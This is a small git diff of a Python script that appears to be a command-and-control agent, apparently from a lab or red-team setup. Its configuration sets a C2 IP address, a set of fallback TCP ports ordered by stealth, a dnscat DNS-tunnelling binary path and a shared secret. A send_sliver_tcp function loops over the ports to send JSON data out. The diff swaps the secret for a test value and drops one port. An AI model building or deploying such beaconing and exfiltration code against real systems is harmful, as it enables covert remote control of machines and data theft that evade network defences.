@@ -6,9 +6,9 @@ import subprocess
 # --- CONFIGURATION ---
 C2_IP = "192.168.56.101"
 # Priority order: Stealthiest (443) to most obvious (4444)
-TCP_PORTS = [443, 80, 445, 8080, 4444] 
-DNS_SECRET = "46c3ebb138a4bfed2d80acf4ae432a9e"
-DNS_BIN_PATH = "/tmp/dnscat" # Ensure Ansible puts it here!
+TCP_PORTS = [443, 80, 8080, 4444] 
+DNS_SECRET = "testSecret"
+DNS_BIN_PATH = "/tmp/dnscat" 
 
 def send_sliver_tcp(data):
     """Attempts to send JSON data over a list of TCP ports."""
@@ -16,7 +16,7 @@ def send_sliver_tcp(data):
     
     for port in TCP_PORTS:
         try:
-            # We use a short timeout so the agent doesn't hang forever on a blocked port
+            # added a short timeout so the agent doesn't hang forever on a blocked port
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.settimeout(4) 
                 print(f"[*] Trying TCP Port {port}...")
